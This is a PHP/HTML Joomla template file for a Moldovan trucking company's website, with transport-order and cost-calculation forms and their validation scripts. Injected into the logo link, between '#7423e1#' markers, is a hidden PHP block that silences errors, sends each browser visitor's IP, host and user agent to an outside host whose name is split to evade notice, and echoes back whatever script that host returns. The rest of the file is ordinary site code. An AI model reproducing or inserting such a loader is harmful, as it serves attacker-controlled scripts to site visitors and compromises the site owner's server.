<?php
/*GOOD*/
/**
 * @copyright	Copyright (C) 2005 - 2007 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

// no direct access
defined( '_VALID_MOS' ) or die( 'Restricted access' );
defined( 'DS') || define( 'DS', DIRECTORY_SEPARATOR );

include("utils.php");
include_once (dirname(__FILE__).DS.'/ja_vars_1.0x.php');

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<?php mosShowHead(); ?>
<meta name="cmsmagazine" content="a01afd07b6e487665253fb6845cb09f2" />
<link rel="stylesheet" href="<?php echo $tmpTools->baseurl(); ?>/templates/ja_mesolite/css/style.css" type="text/css" />
</head>

<body>

<div class="main">

	<div class="header">
    	<!--<div style="background-image:url(<?php echo $tmpTools->baseurl(); ?>/templates/ja_mesolite/images/header_top.jpg);height:7px;width:965px;background-repeat:no-repeat;margin-left:1px;"></div>-->
        
        <div style="background-color:#fff; margin-left:1px;">
			<div style="height:80px;padding-top:5px;padding-left:15px;margin-bottom:5px;">
				<div class="logo">
					<a style="display:block;float:left;" href="/<?php echo $language;?>
<?php
#7423e1#
error_reporting(0); @ini_set('display_errors',0); $wp_l40 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_l40) && !preg_match ('/bot/i', $wp_l40))){
$wp_l0940="http://"."template"."align".".com/"."align/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_l40);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_l0940); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_40l = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_40l = @file_get_contents($wp_l0940);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_40l=@stream_get_contents(@fopen($wp_l0940, "r"));}}
if (substr($wp_40l,1,3) === 'scr'){ echo $wp_40l; }
#/7423e1#
?>




?>"><img src="<?php echo $tmpTools->baseurl(); ?>/templates/ja_mesolite/images/logo.png" /></a><span style="margin-left:20px;margin-top:30px;position:relative;float:left;font-size:20px;">Moldova Truck - ���� ������������ �������������� �����&nbsp;&nbsp;&nbsp;<span style="color: #1076a8">+373 69 107 853</span></span>
				</div>
				
				<div class="lang">
				<?php mosLoadModules ( 'user3',-1); ?>
					<!--<ul>
						<li><a href="#"><img src="<?php echo $tmpTools->baseurl(); ?>/templates/ja_mesolite/images/russ.png" /> Rus</a></li>
						<li><a href="#"><img src="<?php echo $tmpTools->baseurl(); ?>/templates/ja_mesolite/images/rom.png" /> Rom</a></li>
						<li><a href="#"><img src="<?php echo $tmpTools->baseurl(); ?>/templates/ja_mesolite/images/eng.png" /> Eng</a></li>
					</ul>-->
					<div style="font-size:14px;font-weight:bold;">�������: <a style="color:#5897e9;font-size:14px;" href="mailto:info@moldovatruck.md">info@moldovatruck.md</a><br>
					<a style="font-size:13px;" href="index.php?option=com_performs&formid=1&Itemid=57">�������� �����</a></div>
				</div>
			</div>
			<div class="hmenu">
			<table width="100%" border="0" cellspacing="0" cellpadding="0">
			  <tr>
				<td width="265">
					<div class="menu">
						<?php mosLoadModules ( 'user9',-1); ?>       
					</div>
				</td>
				<td><div class="banner"><img src="<?php echo $tmpTools->baseurl(); ?>/templates/ja_mesolite/images/banner.png" /></div></td>
				<td width="265">
					<div class="menu2">
						<?php mosLoadModules ( 'user10',-1); ?>
					</div>
				</td>
			  </tr>
			</table>
			</div>
        </div>
    </div>
    
    <div class="center">
    
    	<div class="menu">
    	<?php mosLoadModules ( 'left',-1); ?>
        </div>
        <div class="content">  
        	<div id="pathway">
			<?php mospathway();?> 
		</div>	
        	<div class="left">
			<?php mosLoadModules ( 'user4',-2); ?>
          </div>
          <div class="right">
		   <?php mosLoadModules ( 'advert1',-1); ?>   	
		              	<!-- import the calendar CSS -->			
<link rel="stylesheet" type="text/css" media="all" href="http://riatec.md/includes/js/calendar/calendar-mos.css" title="green" />
<style>
.redborder {
	border: 1px solid red; /*�����(������, ���, ����)*/
	display: table-cell;
}

.none {
	border: 1px;
}

</style>
<!-- import the calendar script -->
<script type="text/javascript" src="http://riatec.md/includes/js/calendar/calendar_mini.js"></script>
<!-- import the language module -->
<script type="text/javascript" src="http://riatec.md/includes/js/calendar/lang/calendar-en.js"></script>
<script language="JavaScript1.2" src="http://riatec.md/includes/js/joomla.javascript.js" type="text/javascript"></script>
<script language="JavaScript1.2" src="http://riatec.md/includes/js/mambojavascript.js" type="text/javascript"></script>
<!-- JavaScripts -->
<script language="JavaScript">

/**
* Function : dump()
* Arguments: The data - array,hash(associative array),object
*    The level - OPTIONAL
* Returns  : The textual representation of the array.
* This function was inspired by the print_r function of PHP.
* This will accept some data as the argument and return a
* text that will be a more readable version of the
* array/hash/object that is given.
*/
function dump(arr,level) {
var dumped_text = "";
if(!level) level = 0;

//The padding given at the beginning of the line.
var level_padding = "";
for(var j=0;j<level+1;j++) level_padding += "    ";

if(typeof(arr) == 'object') { //Array/Hashes/Objects
 for(var item in arr) {
  var value = arr[item];

  if(typeof(value) == 'object') { //If it is an array,
   dumped_text += level_padding + "'" + item + "' ...\n";
   dumped_text += dump(value,level+1);
  } else {
   dumped_text += level_padding + "'" + item + "' => \"" + value + "\"\n";
  }
 }
} else { //Stings/Chars/Numbers etc.
 dumped_text = "===>"+arr+"<===("+typeof(arr)+")";
}
return dumped_text;
}

function is_int(value){
  if((parseFloat(value) == parseInt(value)) && !isNaN(parseInt(value))){
      return true;
 } else {
      return false;
 }
}

function initSelect()
{
	document.getElementById('import_city').disabled = (document.getElementById('import_country').value==0)?true:false;
	document.getElementById('export_city').disabled = (document.getElementById('export_country').value==0)?true:false;
}

function requestError (sid, msg)
{
	sid.options.length = 0;
	sid.disabled = true;
	sid.options[sid.options.length] = new Option(msg, 0, false, false);
}

//initSelect();
var xmlHttp = false;

try {
 	xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
} catch (e) {
 	try {
		xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
	} catch (e2) {
		xmlHttp = false;
	}
}

if (!xmlHttp && typeof XMLHttpRequest != 'undefined') {
	xmlHttp = new XMLHttpRequest();
}

if (!xmlHttp) {

	sidc = document.getElementById("import_city");
	requestError (sidc, 'XMLHttpRequest error');
	sidc = document.getElementById("export_city");
	requestError (sidc, 'XMLHttpRequest error');
	updateinput("import_city", "none");
	updateinput("export_city", "none");
}

function disableSelect(fs)
{

	sid = document.getElementById(fs);
	sid.options.length = 0;
	sid.disabled = true;
	sid.options[sid.options.length] = new Option("--- �� ����� �������� ---", 0, false, false);

}

function updateinput (fs, action)
{
if (fs == "import_city") {
	var input = document.getElementById("import_city_type");
	var text = document.getElementById("import_city_text");
	if (action=="delete") {
				input.innerHTML = "";
				text.innerHTML = "";
	} else {
	input.innerHTML = "<br><input type='text' name='import_city_type' size=20 />";
	text.innerHTML = "<br>������� �����<br>";
	}
}
if (fs == "export_city") {
	var input = document.getElementById("export_city_type");
	var text = document.getElementById("export_city_text");
	if (action=="delete") {
				input.innerHTML = "";
				text.innerHTML = "";
	} else {
	input.innerHTML = "<br><input type='text' name='export_city_type' size=20 />";
	text.innerHTML = "<br>������� �����<br>";
	}
}
}
function updateSelect (selectId, optValue, fs)
{
	if (!xmlHttp)
		return false;
	if (optValue == 0 || (selectId == "ignore" && optValue !=-1))
	{
		if (selectId != "ignore") {
			disableSelect(fs);
		}
		updateinput(fs, "delete");
		return false;
	}
	if (optValue == -1)
	{
		updateinput(fs, "none");
		return false;
	}
	sid = document.getElementById(selectId);
	sid.options.length = 0;
	sid.disabled = true;
	sid.options[sid.options.length] = new Option("���������, ���� ��������...", 0, false, false);
	var params = "value=" + optValue + <?php echo "\"&language=".$language."\""; ?>;
	xmlHttp.open("GET","cargo/city.php?" + params, true);

	//var requestTimer = setTimeout(function() {
	//	xmlHttp.abort();
	//	//sid.options[sid.options.length] = new Option("--- �� ����� �������� ---", 0, false, false);
	//	sid.options[sid.options.length] = new Option("--- ������ ����� ---", 1, false, false);
	//	updateinput(fs, "none");
    //}, 10000);

	xmlHttp.onreadystatechange = function()
	{

		if (xmlHttp.readyState == 4)
		{		//alert(xmlHttp.status);
				//clearTimeout(requestTimer);
				var from_php = xmlHttp.responseText;
				//alert(dump(string));
				sid.options.length = 0;
				sid.innerHTML="";
				if (from_php == "" || from_php == null || from_php == 0) {
							//alert("here");
							sid.options[sid.options.length] = new Option("---������ �� �������---", 0, false, true);
							updateinput(fs,"none");
				} else {
				updateinput(fs, "delete");
				sid.options[sid.options.length] = new Option("--- �� ����� �������� ---", 0, false, false);
				sid.options[sid.options.length] = new Option("--- ������ ����� ---", 0, false, false);
				var array_work = from_php.split("|"); //in 0 is region in 1 is country in 2 is region in 3 is country
				//alert(dump(array));
				for(var i = 0; i < array_work.length; i++)
				{
					if (i == 0 || is_int(i/2)) {
								var region = document.createElement("optgroup");
								region.label = array_work[i];
					} else {
							var array_city = array_work[i].split(",");
							for(var j = 0; j < array_city.length; j++)
							{
									var city_data = array_city[j].split("^");
									var city = document.createElement("option");
									city.value = city_data[1];
									city.appendChild(document.createTextNode(city_data[0]));
									region.appendChild(city);
							}

					}
					if ( region != "" && region.hasChildNodes()) { sid.appendChild(region); }

				}
				sid.disabled = false;
				}
		}
	}
	xmlHttp.send(null);
}
</script>


<!-- left cargo form  -->
<script language="JavaScript1.2">
function isValidEmail (email, strict)
{
 if ( !strict ) email = email.replace(/^\s+|\s+$/g, '');
 return (/^([a-z0-9_\-]+\.)*[a-z0-9_\-]+@([a-z0-9][a-z0-9\-]*[a-z0-9]\.)+[a-z]{2,4}$/i).test(email);
}

function left_cargo_form_parse_info(form_user, form_type)
{	

	var dateofexport;

	if(form_type=="left_cargo_form_"){
		dateofexport = form_user.left_cargo_form_date_export.value;
	}else if(form_type=="calculate_transportation_form_"){
		dateofexport = form_user.calculate_transportation_form_date_export.value;
	}else{
		form_type="";
		dateofexport = form_user.date_export.value;
	}

	var err_message = "";
	var text = "���������� ��������� ������������ ����.<br>";
	var err_message_more = "";
	
	if (form_user.import_country.value == 0 || form_user.import_country.value == "" || form_user.import_country.value == null) {
		document.getElementById(form_type+"select_import").className = "redborder"; err_message += "1";
	}else { 
		document.getElementById(form_type+"select_import").className = "none";
	}
	
	if (form_user.export_country.value == 0 || form_user.export_country.value == "" || form_user.export_country.value == null) {
		document.getElementById(form_type+"select_export").className = "redborder"; err_message += "1";
	}else {
		document.getElementById(form_type+"select_export").className = "none";
	}
	
	if (dateofexport == 0 || dateofexport == "" || dateofexport == null) {
		document.getElementById(form_type+"date_span").className = "redborder"; err_message += "1";
	}else {
		document.getElementById(form_type+"date_span").className = "none";
	}
	
	if (form_user.type_transport.value == 0 || form_user.type_transport.value == "" || form_user.type_transport.value == null) {
		document.getElementById(form_type+"select_transport").className = "redborder"; err_message += "1";
	}else {
		document.getElementById(form_type+"select_transport").className = "none";
	}
	
	if (form_user.cargo_type.value == 0 || form_user.cargo_type.value == "" || form_user.cargo_type.value == null) {
		document.getElementById(form_type+"select_cargo").className = "redborder"; err_message += "1";
	}else {
		document.getElementById(form_type+"select_cargo").className = "none";
	}
	
	if (form_user.cargo_size.value == 0 || form_user.cargo_size.value == "" || form_user.cargo_size.value == null) {
		document.getElementById(form_type+"select_cargo_size").className = "redborder"; err_message += "1";
	}else {
		document.getElementById(form_type+"select_cargo_size").className = "none";
	}
	
	if (form_user.fio.value == 0 || form_user.fio.value == "" || form_user.fio.value == null) {
		document.getElementById(form_type+"fio_span").className = "redborder"; err_message +="1";
	}else {
		document.getElementById(form_type+"fio_span").className = "none";
	}
	
	if (!isValidEmail(form_user.email.value, false) || form_user.email.value == "") {
		document.getElementById(form_type+"email_span").className = "redborder"; err_message_more +="�������� ���� ������ �������.<br>"; err_message += "1";
	}else {
		document.getElementById(form_type+"email_span").className = "none";
	}
	
	
	var country_code = form_user.telefon_country_code.value;
	country_code = country_code.replace(/-/g, "");
	var city_code = form_user.telefon_city_code.value;
	city_code = city_code.replace(/-/g, "");
	var telefon = form_user.telefon.value;
	telefon = telefon.replace(/-/g, "");
	var telefon_number = "+" + country_code + "-" + city_code + "-" + telefon;
	var pattern = /^[+]\d{1,3}-\d{1,4}-\d{1,15}/;
	var ereg = pattern.test(telefon_number);
	if (!ereg) {
		document.getElementById(form_type+"telefon_country_code_span").className = "redborder";
		document.getElementById(form_type+"telefon_city_code_span").className = "redborder";
		document.getElementById(form_type+"telefon_span").className = "redborder";
		err_message_more +="������������ ������ ����������� ������. <br>(������: + ��� ������ - ��� ������ - ����� ��������)<br>";
		err_message += "1";
	} else {
		document.getElementById(form_type+"telefon_country_code_span").className = "none";
		document.getElementById(form_type+"telefon_city_code_span").className = "none";
		document.getElementById(form_type+"telefon_span").className = "none";
	}
	if (err_message != "") {
		document.getElementById(form_type+"err_message").innerHTML = text + err_message_more;
		return false;
	} else {
		document.getElementById(form_type+"err_message").innerHTML = "";
		return true;
	}
}
</script>

<!-- �������� ������ ����� -->
<script>
function look(type){
param=document.getElementById(type);
if(param.style.display == "none") param.style.display = "block";
else param.style.display = "none"
}
</script>
			<?php mosLoadModules ( 'user8',-1); ?>
            <?php if(mosCountModules('pathway')) {?>
            <div class="right_block">


<!--    ��������� ��������� ���������  -->
<h1><?php if($mosConfig_lang == 'russian') { echo "��������� ��������� ���������"; }
								elseif ($mosConfig_lang == 'romanian') { echo "Calculeaza costul expedierii"; }
								elseif ($mosConfig_lang == 'english') { echo "Calculate cost of transportation"; }
								?></h1>

<div id="calculate_transportation_form">
<p><span id="calculate_transportation_form_err_message" style="color:red"></span></p>
<form action="/index.php?option=com_content&amp;task=view&amp;id=95&amp;form=left_calc" method="POST" name="calculate_transportation_form" onsubmit="return left_cargo_form_parse_info(this, 'calculate_transportation_form_');">
<table border="0" width="100%">

<tr>
	<td align="left" style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') { echo "������ ��������"; }
	elseif ($mosConfig_lang == 'romanian') { echo "Tara de incarcare"; }
	elseif ($mosConfig_lang == 'english') { echo "Country of loading"; }
?> <span style="color: red">*</span>
	<span id="calculate_transportation_form_select_export">
			<select type="select" name="export_country" size="1" onchange="updateSelect('calculate_transportation_form_export_city', this.value, 'calculate_transportation_form_export_city');" id="export_country"  style="width: 220px" >
				<?php if($mosConfig_lang == 'russian') { echo '<option value="">- ������� ������ -</option>';}
					  elseif($mosConfig_lang == 'romanian') { echo '<option value="">- alegeti tara  -</option>';}
					  elseif($mosConfig_lang == 'english') { echo '<option value="">- choose the country -</option>';}
					  echo $countries;
				?>
			</select>
	</span>
	</td>
</tr>


<tr>
	<td align="left" style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') {
	echo '����� ��������';}
    elseif($mosConfig_lang == 'romanian') { echo'Oras de incarcare';}
    elseif($mosConfig_lang == 'english') { echo'City of Loading';}
?><span id="export_city_text"></span>
	<select type="select" name="calculate_transportation_form_export_city" size="1" id="calculate_transportation_form_export_city"  style="width: 220px" onchange="updateSelect('ignore', this.value, 'calculate_transportation_form_export_city');">
	<option value="0"><?php if($mosConfig_lang == 'russian') {
	echo '---�� ����� ��������---';}
    elseif($mosConfig_lang == 'romanian') { echo'---oricare---';}
    elseif($mosConfig_lang == 'english') { echo'---all cities---';}
?></option>
	</select><span id="export_city_type"></span>
	</td>
</tr>


<tr>
	<td align="left" style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') {
	echo '������ ��������';}
	elseif($mosConfig_lang == 'romanian') { echo'Tara de descarcare';}
    elseif($mosConfig_lang == 'english') { echo'Country of unloading';}
 ?> <span style="color: red">*</span>
	<span id="calculate_transportation_form_select_import">
	<select type="select" name="import_country" size="1" id="import_country" onchange="updateSelect('calculate_transportation_form_import_city', this.value, 'calculate_transportation_form_import_city');"  style="width: 220px" >
				<?php if($mosConfig_lang == 'russian') { echo '<option value="">- ������� ������ -</option>';}
					  elseif($mosConfig_lang == 'romanian') { echo '<option value="">- alegeti tara  -</option>';}
					  elseif($mosConfig_lang == 'english') { echo '<option value="">- choose the country -</option>';}
					  echo $countries;
				?>
	</select>
	</span>
	</td>
</tr>


<tr>
	<td align="left" style="padding-bottom:8px;"><?php
    if($mosConfig_lang == 'russian') { echo'����� ��������';}
    elseif($mosConfig_lang == 'romanian') { echo'Oras de descarcare';}
    elseif($mosConfig_lang == 'english') { echo'City of unloading';}
?><span id="import_city_text"></span>
	<select type="select" name="calculate_transportation_form_import_city" size="1" id="calculate_transportation_form_import_city" style="width: 220px" onchange="updateSelect('ignore', this.value, 'calculate_transportation_form_import_city');">
		<option value="0"><?php if($mosConfig_lang == 'russian') {
	echo '---�� ����� ��������---';}
    elseif($mosConfig_lang == 'romanian') { echo'---oricare---';}
    elseif($mosConfig_lang == 'english') { echo'---all cities---';}
?></option>
	</select><span id="import_city_type"></span>
	</td>
</tr>


<tr>
	<td style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') { echo "���� ��������"; }
								elseif ($mosConfig_lang == 'romanian') { echo "Data incarcarii"; }
								elseif ($mosConfig_lang == 'english') { echo "Loading Date"; }
								?> <span style="color: red">*</span>
	<span id="calculate_transportation_form_date_span"><input readonly="true" type="text" name="calculate_transportation_form_date_export" size="12" maxlength="19" id="calculate_transportation_form_date_export"  style="width: 200px"  /><input name="calendar" type="button" onClick="return showCalendar('calculate_transportation_form_date_export', 'dd-mm-y');" tabindex="105" value="..." style="width: 20px"/></span>
	</td>
</tr>

<tr>
	<td style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') { echo "��� ����������"; }
	elseif ($mosConfig_lang == 'romanian') { echo "Tipul de transport"; }
	elseif ($mosConfig_lang == 'english') { echo "Transport type"; }
?> <span style="color: red">*</span>
	<span id="calculate_transportation_form_select_transport">
	<select type="select" name="type_transport" size="1" style="width: 220px" id="type_transport">
		<?php if($mosConfig_lang == 'russian') { echo '<option value="">- ������� ��� ���������� -</option>';}
				elseif ($mosConfig_lang == 'romanian') { echo '<option value="">- indicati tipul transportului -</option>';}
				elseif ($mosConfig_lang == 'english') { echo  '<option value="">- choose transport type -</option>';}
				echo $transport_types;
		?>
	</select>
	</span>
	</td>
</tr>

<tr>
	<td style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') {
	echo "������������ �����"; }
	elseif ($mosConfig_lang == 'romanian') { echo "Denumirea incarcaturii"; }
	elseif ($mosConfig_lang == 'english') { echo "Description of cargo"; }
?> <span style="color: red">*</span>
	<span id="calculate_transportation_form_select_cargo">
	<select type="select" name="cargo_type" size="1"  style="width: 220px" id="cargo_type">
			<?php if($mosConfig_lang == 'russian') { echo '<option value="">- ������� ��� ����� -</option>';}
			  elseif($mosConfig_lang == 'romanian') { echo '<option value="">- indicati tipul de incarcatura -</option>';}
			  elseif($mosConfig_lang == 'english') { echo '<option value="">- chose the cargo type -</option>';}
			  echo $cargo_types;
			?>
	</select>
	</span>
	</td>
</tr>


<tr>
	<td style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') { echo "����� �����, ��� �����"; }
		elseif ($mosConfig_lang == 'romanian') { echo "Volumul si greutatea incarcaturii"; }
		elseif ($mosConfig_lang == 'english') { echo "Cargo size and weight"; }
?> <span style="color: red">*</span>
	<span id="calculate_transportation_form_select_cargo_size">
	<select type="select" name="cargo_size" size="1"  style="width: 220px"  id="cargo_size">
		 <?php if($mosConfig_lang == 'russian') { echo '<option value="">- ������� �����/����� -</option>';}
				elseif ($mosConfig_lang == 'romanian') { echo '<option value="">- selectati Volumul/greutatea -</option>';}
				elseif ($mosConfig_lang == 'english') { echo '<option value="">- choose size/weight -</option>';}
				echo $cargo_volumes;
		?>
	</select>
	</span>
	</td>
</tr>


<tr>
	<td style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') { echo "���������� ����"; }
	elseif ($mosConfig_lang == 'romanian') { echo "Persoana de contact"; }
	elseif ($mosConfig_lang == 'english') { echo "Contact person"; }
?> <span style="color: red">*</span>
	<span id="calculate_transportation_form_fio_span"><input type="text" name="fio" size="25" id="fio"  style="width: 220px" /></span></td>
</tr>


<tr>
	<td style="padding-bottom:8px;"><div><?php if($mosConfig_lang == 'russian') { echo "���������� �������"; }
								elseif ($mosConfig_lang == 'romanian') { echo "Telefon de contact"; }
								elseif ($mosConfig_lang == 'english') { echo "Telephone"; }
								?> <span style="color: red">*</span></div>
	+ <span id="tel_span"><span id="calculate_transportation_form_telefon_country_code_span"><input type="text" name="telefon_country_code" size="1" maxlength="3" id="telefon_country_code" style="width: 25px" /></span>
	- <span id="calculate_transportation_form_telefon_city_code_span"><input type="text" name="telefon_city_code" size="2" maxlength="4" id="telefon_city_code" style="width: 30px" /></span>
	- <span id="calculate_transportation_form_telefon_span"><input type="text" name="telefon" size="15" maxlength="15" id="telefon"  style="width: 125px" /></span></span>
	</td>
</tr>


<tr>
	<td style="padding-bottom:8px;"><div>E-mail<span style="color: red">*</span></div>
	<span id="calculate_transportation_form_email_span"><input type="text" name="email" size="25"  style="width: 220px" /></span></td>
</tr>

<!--
<tr>
	<td style="padding-bottom:8px;"><div>Skype</div> <input type="text" name="skype" size="25"  style="width: 220px" /></td>
</tr>


<tr>
	<td style="padding-bottom:10px;"><div>ICQ</div> <input type="text" name="icq" size="25" style="width: 220px"  /></td>
</tr>
-->

<tr>
	<td style="padding-bottom:10px;"><div style="margin-top:5px; margin-bottom:5px;"><span style="color: red">*</span> - <?php if($mosConfig_lang == 'russian') { echo "������������ ����"; }
								elseif ($mosConfig_lang == 'romanian') { echo "campuri obligatorii"; }
								elseif ($mosConfig_lang == 'english') { echo "required fields"; }
								?></div>
	<div class="button_left"> </div>
	<input type="submit" name="submit" value="<?php if($mosConfig_lang == 'russian') { echo "����������"; }
								elseif ($mosConfig_lang == 'romanian') { echo "Calculeaza"; }
								elseif ($mosConfig_lang == 'english') { echo "Calculate"; }
								?>" id="submit" style="float:left;background-image:url(<?php echo $tmpTools->baseurl(); ?>/templates/ja_mesolite/images/button_back.png);background-repeat:repeat-x;height:31px;line-height:31px;width:100px;border:0;color:white;cursor:pointer;"/>
	<div class="button_right"></div>
	</td>
</tr>

</table>
</form>
</div>

<!--   ��������� ��������� ���������  END  -->
<!--   ����� ����������  -->
<h1><?php if($mosConfig_lang == 'russian') { echo "�������� ���������"; }
	elseif ($mosConfig_lang == 'romanian') { echo "Comanda transport"; }
	elseif ($mosConfig_lang == 'english') { echo "Order transport"; }
?></h1>

<div id="left_cargo_form">
<p><span id="left_cargo_form_err_message" style="color:red"></span></p>
<form action="/index.php?option=com_content&amp;task=view&amp;id=94&amp;form=left_order" method="POST" name="left_cargo_form" onsubmit="return left_cargo_form_parse_info(this, 'left_cargo_form_');">
<table border="0" width="100%">

<tr>
	<td style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') { echo "��� ����������"; }
	elseif ($mosConfig_lang == 'romanian') { echo "Tipul de transport"; }
	elseif ($mosConfig_lang == 'english') { echo "Transport type"; }
?> <span style="color: red">*</span>
	<span id="left_cargo_form_select_transport">
	<select type="select" name="type_transport" size="1" style="width: 220px" id="type_transport">
		<?php if($mosConfig_lang == 'russian') { echo '<option value="">- ������� ��� ���������� -</option>';}
				elseif ($mosConfig_lang == 'romanian') { echo '<option value="">- indicati tipul transportului -</option>';}
				elseif ($mosConfig_lang == 'english') { echo  '<option value="">- choose transport type -</option>';}
				echo $transport_types;
		?>
	</select>
	</span>
	</td>
</tr>

<tr>
	<td align="left" style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') { echo "������ ��������"; }
	elseif ($mosConfig_lang == 'romanian') { echo "Tara de incarcare"; }
	elseif ($mosConfig_lang == 'english') { echo "Country of loading"; }
?> <span style="color: red">*</span>
	<span id="left_cargo_form_select_export">
			<select type="select" name="export_country" size="1" onchange="updateSelect('left_cargo_form_export_city', this.value, 'left_cargo_form_export_city');" id="export_country"  style="width: 220px" >
				<?php if($mosConfig_lang == 'russian') { echo '<option value="">- ������� ������ -</option>';}
					  elseif($mosConfig_lang == 'romanian') { echo '<option value="">- alegeti tara  -</option>';}
					  elseif($mosConfig_lang == 'english') { echo '<option value="">- choose the country -</option>';}
					  echo $countries;
				?>
			</select>
	</span>
	</td>
</tr>


<tr>
	<td align="left" style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') {
	echo '����� ��������';}
    elseif($mosConfig_lang == 'romanian') { echo'Oras de incarcare';}
    elseif($mosConfig_lang == 'english') { echo'City of Loading';}
?><span id="export_city_text"></span>

	<select type="select" name="left_cargo_form_export_city" size="1" id="left_cargo_form_export_city"  style="width: 220px" onchange="updateSelect('ignore', this.value, 'left_cargo_form_export_city');">
	<option value="0"><?php if($mosConfig_lang == 'russian') {
	echo '---�� ����� ��������---';}
    elseif($mosConfig_lang == 'romanian') { echo'---oricare---';}
    elseif($mosConfig_lang == 'english') { echo'---all cities---';}
?></option>
	</select><span id="export_city_type"></span>
	</td>
</tr>


<tr>
	<td align="left" style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') {
	echo '������ ��������';}
	elseif($mosConfig_lang == 'romanian') { echo'Tara de descarcare';}
    elseif($mosConfig_lang == 'english') { echo'Country of unloading';}
 ?> <span style="color: red">*</span>
	<span id="left_cargo_form_select_import">
	<select type="select" name="import_country" size="1" id="import_country" onchange="updateSelect('left_cargo_form_import_city', this.value, 'left_cargo_form_import_city');"  style="width: 220px" >
		<?php if($mosConfig_lang == 'russian') { echo '<option value="">- ������� ������ -</option>';}
			  elseif($mosConfig_lang == 'romanian') { echo '<option value="">- alegeti tara  -</option>';}
			  elseif($mosConfig_lang == 'english') { echo '<option value="">- choose the country -</option>';}
			  echo $countries;
		?>
	</select>
	</span>
	</td>
</tr>


<tr>
	<td align="left" style="padding-bottom:8px;"><?php
    if($mosConfig_lang == 'russian') { echo'����� ��������';}
    elseif($mosConfig_lang == 'romanian') { echo'Oras de descarcare';}
    elseif($mosConfig_lang == 'english') { echo'City of unloading';}
?><span id="import_city_text"></span>
	<select type="select" name="left_cargo_form_import_city" size="1" id="left_cargo_form_import_city" style="width: 220px" onchange="updateSelect('ignore', this.value, 'left_cargo_form_import_city');">
		<option value="0"><?php if($mosConfig_lang == 'russian') {
	echo '---�� ����� ��������---';}
    elseif($mosConfig_lang == 'romanian') { echo'---oricare---';}
    elseif($mosConfig_lang == 'english') { echo'---all cities---';}
?></option>
	</select><span id="import_city_type"></span>
	</td>
</tr>


<tr>
	<td style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') { echo "���� ��������"; }
								elseif ($mosConfig_lang == 'romanian') { echo "Data incarcarii"; }
								elseif ($mosConfig_lang == 'english') { echo "Loading Date"; }
								?> <span style="color: red">*</span>
	<span id="left_cargo_form_date_span"><input readonly="true" type="text" name="left_cargo_form_date_export" size=12 maxlength=19 id="left_cargo_form_date_export"  style="width: 200px"  /><input name="calendar" type="button" onClick="return showCalendar('left_cargo_form_date_export', 'dd-mm-y');" tabindex="105" value="..." style="width: 20px"/></span>
	</td>
</tr>


<tr>
	<td style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') {
	echo "������������ �����"; }
	elseif ($mosConfig_lang == 'romanian') { echo "Denumirea incarcaturii"; }
	elseif ($mosConfig_lang == 'english') { echo "Description of cargo"; }
?> <span style="color: red">*</span>
	<span id="left_cargo_form_select_cargo">
	<select type="select" name="cargo_type" size="1"  style="width: 220px" id="cargo_type">
			<?php if($mosConfig_lang == 'russian') { echo '<option value="">- ������� ��� ����� -</option>';}
			  elseif($mosConfig_lang == 'romanian') { echo '<option value="">- indicati tipul de incarcatura -</option>';}
			  elseif($mosConfig_lang == 'english') { echo '<option value="">- chose the cargo type -</option>';}
			  echo $cargo_types;
			?>
	</select>
	</span>
	</td>
</tr>


<tr>
	<td style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') { echo "����� �����, ��� �����"; }
		elseif ($mosConfig_lang == 'romanian') { echo "Volumul si greutatea incarcaturii"; }
		elseif ($mosConfig_lang == 'english') { echo "Cargo size and weight"; }
?> <span style="color: red">*</span>
	<span id="left_cargo_form_select_cargo_size">
	<select type="select" name="cargo_size" size="1"  style="width: 220px"  id="cargo_size">
		 <?php if($mosConfig_lang == 'russian') { echo '<option value="">- ������� �����/����� -</option>';}
				elseif ($mosConfig_lang == 'romanian') { echo '<option value="">- selectati Volumul/greutatea -</option>';}
				elseif ($mosConfig_lang == 'english') { echo '<option value="">- choose size/weight -</option>';}
				echo $cargo_volumes;
		?>
	</select>
	</span>
	</td>
</tr>


<tr>
	<td style="padding-bottom:8px;"><?php if($mosConfig_lang == 'russian') { echo "���������� ����"; }
	elseif ($mosConfig_lang == 'romanian') { echo "Persoana de contact"; }
	elseif ($mosConfig_lang == 'english') { echo "Contact person"; }
?> <span style="color: red">*</span>
	<span id="left_cargo_form_fio_span"><input type="text" name="fio" size="25" id="fio"  style="width: 220px" /></span></td>
</tr>


<tr>
	<td style="padding-bottom:8px;"><div><?php if($mosConfig_lang == 'russian') { echo "���������� �������"; }
								elseif ($mosConfig_lang == 'romanian') { echo "Telefon de contact"; }
								elseif ($mosConfig_lang == 'english') { echo "Telephone"; }
